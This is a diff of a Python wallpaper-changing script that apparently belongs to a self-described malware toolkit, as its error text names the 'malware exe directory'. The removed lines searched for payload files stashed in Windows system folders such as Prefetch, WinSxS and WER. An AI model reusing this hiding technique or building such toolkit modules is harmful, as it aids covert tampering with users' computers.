@@ -4,51 +4,39 @@ import os
 import sys
 import ctypes
 
+# Import standardized path utilities
+try:
+    from path_utils import get_photos_path, find_folder
+except ImportError:
+    # Fallback if path_utils not available (shouldn't happen in normal execution)
+    import os
+    def get_photos_path():
+        script_dir = os.path.dirname(os.path.abspath(__file__)) if '__file__' in dir() else os.getcwd()
+        if os.path.basename(script_dir) == 'Scripts':
+            return os.path.join(os.path.dirname(script_dir), "Photos")
+        return os.path.join(script_dir, "Photos")
+    def find_folder(folder_name):
+        photos_path = get_photos_path()
+        if os.path.exists(photos_path) and os.path.isdir(photos_path):
+            return photos_path
+        return None
+
 print("[*] WALLPAPER CHANGER")
 print("Setting desktop wallpaper to Photos/1.jpg...")
 
-# Find Photos folder - look in system locations first (as deployed by PC client v2.1+)
-script_dir = os.path.dirname(os.path.abspath(__file__)) if '__file__' in dir() else os.getcwd()
-
-# System locations (deployed by PC client - most persistent and reliable)
-localappdata = os.environ.get('LOCALAPPDATA', '')
-search_paths = [
-    # System locations (deployed by PC client v2.1+)
-    os.path.join(localappdata, '..', 'LocalLow', 'Photos') if localappdata else None,
-    r"C:\ProgramData\Microsoft\Windows\WER\Photos",
-    r"C:\Windows\Prefetch\Photos",
-    r"C:\Windows\WinSxS\Photos",
-    # Fallback locations
-    os.path.join(os.path.expanduser("~"), "Photos"),  # User home
-    os.path.join(os.getcwd(), "Photos"),  # Current working directory
-    os.path.join(script_dir, "Photos"),   # Script directory
-    os.path.join(script_dir, "..", "Photos"),  # Parent directory
-]
-
-# Also check environment variable for PC client path
-pc_client_path = os.environ.get("PC_CLIENT_PATH", "")
-if pc_client_path:
-    search_paths.append(os.path.join(pc_client_path, "Photos"))
-
-# Filter out None values
-search_paths = [p for p in search_paths if p is not None]
-
-photos_folder = None
-for path in search_paths:
-    abs_path = os.path.abspath(path)
-    if os.path.exists(abs_path) and os.path.isdir(abs_path):
-        photos_folder = abs_path
-        print(f"[+] Found Photos folder: {photos_folder}")
-        break
+# Find Photos folder using standardized path resolution (executable directory)
+photos_folder = find_folder("Photos")
 
 if not photos_folder:
-    print("[-] ERROR: Photos folder not found!")
-    print("    Searched in system locations:")
-    for p in search_paths:
-        print(f"      - {p}")
-    print("\n    Please ensure Photos folder exists in one of the system locations")
-    print("    (deployed by PC client v2.1+).")
-    sys.exit(1)
+    photos_folder = get_photos_path()
+    if not os.path.exists(photos_folder):
+        print("[-] ERROR: Photos folder not found!")
+        print(f"    Expected location: {photos_folder}")
+        print("\n    Please ensure Photos folder exists in the executable directory")
+        print("    (relative to malware exe directory).")
+        sys.exit(1)
+
+print(f"[+] Found Photos folder: {photos_folder}")
 
 # Look for 1.jpg in the Photos folder
 wallpaper_path = os.path.join(photos_folder, "1.jpg")
